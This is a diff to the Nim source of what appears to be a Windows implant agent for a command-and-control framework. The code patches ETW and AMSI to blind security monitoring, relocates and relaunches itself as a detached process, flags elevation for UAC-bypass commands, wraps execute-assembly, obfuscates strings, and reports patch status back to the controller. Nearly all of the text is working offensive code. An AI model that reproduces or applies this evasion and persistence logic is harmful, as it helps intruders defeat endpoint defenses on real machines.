@@ -454,12 +454,12 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool =
     
     var is_success = patch_func(func_name)
-    
     var data = {
+        protectString("patch"): func_name,
         protectString("is_success"): $is_success
     }.toOrderedTable()
     
-    is_success = post_data(client, func_name , $data)
+    is_success = post_data(client, protectString("patch") , $data)
 
     return is_success
 
@@ -624,35 +624,39 @@ proc windows_start*(): void =
     # if elevated - let the unelevated agent know (needed for uac bypass commands)
     if is_elevated_str().strip() == protectString("True"):
         discard create_elevated_mutex()
-
+    
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
     if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
+        # copy and execute to the target path
         var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_windows)
         discard startProcess(agent_execution_path_windows, options={poDaemon})
         quit()
     else:
+        # patch etw & amsi as needed
         var is_etw_success: string
         var is_amsi_success: string
         if patch_etw_on_start:
             is_etw_success = $patch_func(protectString("etw"))
         else:
-            is_etw_success = protectString("avoided")
+            is_etw_success = protectString("skipped")
         if patch_amsi_on_start:
             is_amsi_success = $patch_func(protectString("amsi"))
         else:
-            is_amsi_success = protectString("avoided")
+            is_amsi_success = protectString("skipped")
         
+        # collect agent data
         discard collect_data()
-
-        var data = {
-            protectString("patch_etw"): is_etw_success,
-            protectString("patch_amsi"): is_amsi_success
-        }.toTable 
-
-        discard post_data(client, protectString("patch_func") , $data)
+        
+        # report etw & amsi patching status
+        if patch_etw_on_start or patch_amsi_on_start:
+            var data = {
+                protectString("patch_etw"): is_etw_success,
+                protectString("patch_amsi"): is_amsi_success
+            }.toTable 
+            discard post_data(client, protectString("patch") , $data)
 
 
 
